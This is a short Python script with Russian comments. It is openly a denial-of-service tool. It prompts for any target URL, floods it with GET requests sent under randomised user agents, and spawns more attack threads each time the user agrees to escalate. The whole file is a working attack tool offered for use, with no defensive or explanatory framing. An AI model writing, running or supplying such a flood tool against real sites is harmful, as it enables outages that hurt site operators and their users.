import os

# Установка модуля requests

try:

    import requests as r

except:

    print("Installing module requests...")

    os.system("pip install requests")

    import requests as r

# Установка модуля fake_useragent

try:

    import fake_useragent as f

except:

    print("Installing module fake_useragent...")

    os.system("pip install fake_useragent")

    import fake_useragent as f

# Установка модуля threading

try:

    import threading as t

except:

    print("Installing module threading...")

    os.system("pip install threading")

    import threading as t

# Ввести любую ссылку

url = input("Введите свою ссылку: ")

# Цикл while True, чтобы для атаки

ua = f.UserAgent()

num = 0

def DDoS():

    while True:

        global num

        num = num + 1

        headers = {"User-Agent": ua.random}

        try:

            ddos = r.get(url, headers=headers, timeout=0.120)

        except:

            num = num + 1

start = t.Thread(target=DDoS)

start.start()

while True:

    text = input(f"Запросы {num}. Еще надо по юбльше атак? Введи y или no: ")

    if text == "y" or text == "Y" or text == "n" or text == "N":

        if text == "y" or text == "Y":

            start = t.Thread(target=DDoS)

            start.start()

            print("Атака увеличилась в 1 раза больше!")

        else:

            print("Атака не увеличилась в 1 раз больше!")

    else:

        print("Вы ввели неправильный ответ!")
